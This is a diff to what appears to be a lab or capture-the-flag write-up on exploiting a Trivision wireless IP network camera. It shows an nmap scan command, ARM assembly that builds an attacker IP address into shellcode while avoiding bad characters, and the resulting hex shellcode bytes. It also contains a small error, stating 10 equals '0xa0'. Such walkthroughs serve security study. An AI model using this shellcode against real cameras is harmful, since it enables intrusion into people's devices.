@@ -8,33 +8,21 @@
 + Run `sudo nmap -sT -sC -sV $IP > nmap_log`
 + Download the payload to `Trivision Wireless Streaming Video IP Network Camera`
 
-+ Modyfied payload for ip address Little Endian 10.4.37.160
-```asm
-mov r1,#0x29
-lsl r1,r1,#8
-add r1,r1,#0x07
-lsl r1,r1,#8
-add r1,r1,#0x05
-add r1,r1,#0x05
-lsl r1,r1,#8
-add r1,r1,#0x05
-add r1,r1,#0x05
-push {r1}
-```
-+ Byte for ip address Little Endian 10.4.37.160
-```asm 
-mov r1,#0x95
-add r1,r1,#0x05
-lsl r1,r1,#8
-add r1,r1,#25
-lsl r1,r1,#8
-add r1,r1,#0x04
-lsl r1,r1,#8
-add r1,r1,#0x05
-add r1,r1,#0x05
-str r1,[sp,#-4]!
-```
-
++ Modyfied payload for our ip address Little Endian 10.10.7.41 => 41.7.10.10 because 10 = `0xa0`  and it's a bad char so we need to tricky `10 = 5 + 5`.create the asm with context 'arm'
+    ```assembly
+    mov r1,#0x29
+    lsl r1,r1,#8
+    add r1,r1,#0x07
+    lsl r1,r1,#8
+    add r1,r1,#0x05
+    add r1,r1,#0x05
+    lsl r1,r1,#8
+    add r1,r1,#0x05
+    add r1,r1,#0x05
+    push {r1}
+    ```
++ So the payload became 
+    ```\x29\x10\xa0\xe3\x01\x14\xa0\xe1\x07\x10\x81\xe2\x01\x14\xa0\xe1\x05\x10\x81\xe2\x05\x10\x81\xe2\x01\x14\xa0\xe1\x05\x10\x81\xe2\x05\x10\x81\xe2\x04\x10\x2d\xe5```
 
 # Exploit 
 + run the exploit 
